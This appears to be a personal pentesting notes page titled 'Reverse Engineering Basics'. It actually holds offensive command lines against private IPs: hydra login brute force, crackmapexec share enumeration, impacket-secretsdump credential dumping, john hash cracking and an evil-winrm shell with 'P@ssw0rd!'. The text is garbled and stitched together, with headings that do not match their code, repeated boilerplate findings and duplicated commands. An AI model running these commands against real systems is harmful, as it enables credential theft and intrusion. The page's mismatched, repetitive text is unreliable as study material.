---
TitleSEO: "Reverse Engineering Basics | ZureFX"
TitlePost: "Reverse Engineering Basics"
Author: "ZureFX"
Description: "Personal notes on Reverse Engineering Basics. Quick reference for pentesting and CTF challenges."
Keywords: "persistence, lateral movement, blue team, oscp"
URL: "https://zurefx.github.io/notes/note-reverse-engineering-basics-696.html"
URL_IMAGES: ""
Date: "2024-01-23"
Tags: "Persistence, Lateral Movement, Blue Team, OSCP"
Section: "notes"
Lang: "en"
main_img: "note-reverse-engineering-basics-696"
Permalink: "/notes/note-reverse-engineering-basics-696.html"
BtnLabel: "Read Notes"
Pick: 0
---
## ldapsearch

### evil-winrm

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.89.89.25 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The backup files contained sensitive information that should not have been accessible. The scheduled task ran with elevated privileges and could be abused for escalation.

Group Policy Preferences contained encrypted but recoverable credentials. Privilege escalation was possible due to misconfigured sudo permissions. The database credentials were hardcoded in the application source code.

## Bash

### mimikatz

```powershell
crackmapexec smb 10.95.118.124 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.52.194.168 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.81.114.238
impacket-secretsdump administrator:'P@ssw0rd!'@10.97.188.203
```

Command injection was possible through unsanitized user input in the search functionality. The service account had excessive permissions assigned in Active Directory. Group Policy Preferences contained encrypted but recoverable credentials. Unconstrained delegation was enabled on the compromised machine. Initial enumeration revealed several interesting open ports on the target.

Command injection was possible through unsanitized user input in the search functionality. The application stored sensitive credentials in an unencrypted configuration file. The database credentials were hardcoded in the application source code.

```python
feroxbuster -h
```

The application stored sensitive credentials in an unencrypted configuration file. The kernel version was outdated and vulnerable to a publicly known exploit. The application stored sensitive credentials in an unencrypted configuration file. The scheduled task ran with elevated privileges and could be abused for escalation.

## ACL Abuse

### Insecure Deserialization

> **Note:** SeImpersonatePrivilege was identified as the primary attack vector in this scenario.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.28.130.144
```

- `SeDebugPrivilege`
- `Broken Access Control`
- `LAPS Abuse`
- `sharphound`
- `ligolo-ng`

The application stored sensitive credentials in an unencrypted configuration file. Weak file permissions allowed modification of critical system files. The target system was identified as running a vulnerable version of the service. The target system was identified as running a vulnerable version of the service. Weak file permissions allowed modification of critical system files.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.86.59.90 -u administrator -p 'P@ssw0rd!'
```
